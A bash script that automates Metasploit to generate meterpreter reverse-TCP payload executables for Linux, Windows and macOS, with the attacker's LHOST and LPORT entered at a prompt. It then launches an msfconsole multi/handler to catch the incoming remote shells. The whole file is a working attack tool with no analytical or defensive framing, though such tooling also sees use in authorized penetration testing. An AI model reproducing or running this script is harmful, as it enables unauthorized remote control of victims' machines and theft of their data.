#!/bin/bash

check_program() {
	if ! command -v "$1" &>/dev/null; then
		echo "$1 is not installed. Please install it and try again."
		exit 1
	fi
}

# Check if required programs are installed
check_program msfconsole
check_program msfvenom

read -p "Enter the IP you want to listen on (LHOST): " ip_address
read -p "Enter the port (LPORT): " port

create_payload() {
	os=$1
	file_ext=$2
	echo "Creating payload for $os..."
	msfvenom -p $os/x64/meterpreter/reverse_tcp LHOST=$ip_address LPORT=$port -f $file_ext -o reverse.$file_ext
}

echo "Select the payloads you want to create (separate choices with spaces):"
echo "1) Linux"
echo "2) Windows"
echo "3) macOS"
read -p "Enter your choices (e.g., 1 2 3): " choices

for choice in $choices; do
	case $choice in
	1) create_payload "linux" "elf" ;;
	2) create_payload "windows" "exe" ;;
	3) create_payload "osx" "macho" ;;
	*) echo "Invalid choice: $choice" ;;
	esac
done

echo "For which system do you want to listen?"
echo "1) Linux"
echo "2) Windows"
echo "3) macOS"
read -p "Enter your choice: " listen_choice

case $listen_choice in
1) payload="linux/x64/meterpreter/reverse_tcp" ;;
2) payload="windows/x64/meterpreter/reverse_tcp" ;;
3) payload="osx/x64/meterpreter/reverse_tcp" ;;
*)
	echo "Invalid choice. Exiting."
	exit 1
	;;
esac

echo "Starting msfconsole to listen for incoming connections..."
msfconsole -q -x "use multi/handler; set payload $payload; set lhost $ip_address; set lport $port; exploit"
